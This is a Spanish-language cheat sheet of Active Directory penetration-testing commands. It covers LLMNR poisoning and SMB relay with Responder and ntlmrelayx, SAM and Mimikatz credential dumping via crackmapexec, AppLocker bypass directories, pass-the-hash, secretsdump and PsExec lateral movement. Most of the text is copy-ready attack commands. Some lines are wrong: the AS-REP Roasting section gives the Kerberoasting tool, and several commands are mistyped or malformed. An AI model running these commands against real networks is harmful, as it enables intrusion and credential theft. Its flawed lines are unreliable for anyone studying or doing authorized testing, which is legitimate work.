# Notas Active Directory Pentest
@far00t01

## Discovery 
### fping para la lista de los host disponibles:

`fping -a -g 10.10.10.0/24 2>/dev/null | tee alive_hosts.txt`

### Host de la subnet con protocolo de escritorio remoto (RDP) activado:
`nmap -Pn -vv -p3389 -iL alive_hosts.txt -oN output_host_3389.txt`


## Relay Attacks en Active Directory

### LLMNR Poisoning
Link-Local Multicast Name Resolution (LLMNR) es un protocolo de resolución DNS que no requiere un servidor DNS. LLMNR intenta resolver una solicitud DNS que DNS no pudo cumplir. El envenenamiento de LLMNR proporcionará el hash NTLMv2, que se puede utilizar para descifrar utilizando una herramienta de descifrado de hash como Hashcat o John the Ripper. 

En primer lugar, se requiere que todos los servicios están activados con Responder.

`sudo nano /etc/responder/Responder.conf`

`sudo responder -I eth0 -dwv`

`hashcat -m 5600 <ntlmv2 hash file> <password list>`
(-m 5600 is the option from Hashcat to crack NTLMv2 hashes.)


### SMB Relay Attack
Un ataque de retransmisión SMB consiste en que un atacante captura el hash NTLM de un usuario y lo retransmite a otra máquina de la red. Se hace pasar por el usuario y se autentica contra SMB para obtener acceso shell o a archivos.

### Generar una lista de hosts retransmitibles (SMB Signing disabled)

`crackmapexec smb 10.10.10.0/24 --gen-relay-list output.txt`

`sudo nano /etc/responder/Responder.conf`

Cambiamos los parametros SMB y HTTP en “off” y guardamos el archivo.

`sudo responder -I eth0 -dwv`

Ahora ejecuta ntlmrelayx.py para retransmitir el hash.

`ntlmrelayx.py -tf output.txt -smb2support`


## Pentesting Active Directory sin credenciales

### Enumeracion
LinWinPwn es un script bash que automatiza una serie de comprobaciones de Enumeración y Vulnerabilidad de Active Directory. El script utiliza una serie de herramientas y sirve como envoltorio de las mismas. Las herramientas incluyen: impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound, y otras.

Clonamos el repositorio de LinWinPwn: 

`git clone https://github.com/lefayjey/linWinPwn`

Damos los permisos necesarios e instalamos. 
`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Opciones de uso: 
`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com`

## Enumeracion de Active Directory con credenciales.

ldapsearch -x -H ldap://10.10.10.100 -D 'domain@domain.com' -w 'password' -b "DC=domain,DC=com"

ldapdomaindump es una herramienta que pretende resolver este problema, recopilando y analizando la información disponible a través de LDAP y mostrándola en un formato HTML legible por humanos, así como en archivos json y csv/tsv/greppable legibles por máquinas.
La herramienta fue diseñada con los siguientes objetivos en mente:

La herramienta genera varios archivos que contienen una visión general de los objetos del dominio:

* domain_groups: Lista de grupos del dominio

* domain_users: Lista de usuarios del dominio

* domain_computers: Lista de cuentas de ordenador en el dominio

* domain_policy: Política de dominio, como requisitos de contraseña y política de bloqueo

* domain_trusts: Confianzas de dominio entrantes y salientes, y sus propiedades

Además de dos archivos agrupados:

* domain_users_by_group: Usuarios del dominio por grupo al que pertenecen

* domain_computers_by_os: Ordenación de los ordenadores del dominio por sistema operativo

### Instalacion de la herramienta: 

Clonamos el repositorio: 
`git clone https://github.com/dirkjanm/ldapdomaindump`

Ejecutamos ingresando las credenciales de nuestro usuario + ip del domain controller. 

`python3 ldapdomaindump.py --user "domain\user" -p 'password' ldap://10.10.10.100:389 --no-json --no-grep -o output`


### Enumeracion de Active Directory de forma automatica

Clonamos el repositorio de LinWinPwn: 

`git clone https://github.com/lefayjey/linWinPwn`

Damos los permisos necesarios e instalamos. 
`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Opciones de uso: 

Uso con credenciales

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u testing -p servicess -M user`

Uso con Hash de autenticacion 

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u Administrator -p :3432e23aa4bc545.... -M pwd_dump`


### Se requieren permisos de usuario Administrador: 

### Dump local SAM hashes

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth --sam`


### Mimikatz module

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' -M mimikazt`

`crackmapexec smb 10.10.10.100 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'`

`crackmapexec 10.10.10.100 -u 'Administrator' -p 'PASSWORD' --local-auth --shares`


### Enumerating Applocker Rules

Policy Applocker
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Esto debería mostrar los directorios permitidos donde podemos ejecutar nuestros propios binarios

`PS C:\Tools> (Get-AppLockerPolicy -Local).RuleCollections`

`PS C:\Tools> Get-AppLockerPolicy -Local -Effective -Xml | Set-Content ('C:\users\public\applockerpolicy.xml')`

Si AppLocker fue configurado con reglas por defecto, este directorio está en la lista blanca por defecto:

C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\Tasks
C:\windows\tracing


# AS-REP Roasting
El ASREPRoast es una técnica parecida a Kerberoasting que intenta crackear offline las contraseñas de los usuarios de servicio pero las de los que tienen el atributo DONT_REQ_PREAUTH, es decir, los que no se les requiere pre-autenticación en kerberos. 

`GetUserSPNs.py domain.com/user:password -outputfile hashes.kerberoast`

Remote Desktop with ir without NLA
`rdesktop -d [dt.com](http://dt.com/) -u user1 -p Pa$$w0rd 10.10.10.10 -g 100%`


# Pass the Hash Attack

`$ crackmapexec smb <domain IPv4 IP address>/24 -u <SAM account name> -d <domain name>.local -H <NTLM hash>`

`$ crackmapexec smb <local IPv4 address>/24 -u <username> -H <NTLM hash> — local-auth`

Now run ntlmrelayx.py to relay the credentials, dump domain information, and create a new domain user.
`ntlmrelayx.py -6 -t ldaps://<domain controller IPv4 address> -wh fakewpad.<domain name>.local -l <name folder for domain information dumping>`

`secretsdump.py <domain name>/<mitm6 added user>@<domain controller IPv4 address>`

# Lateral Movement With PsExec
PsExec is a lightweight telnet replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.

`./PsExec64.exe \\<TARGET-IP> -u Administrator -p <PASSWORD> ipconfig`



Referencias interesantes:

https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/
https://learn.microsoft.com/es-es/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties











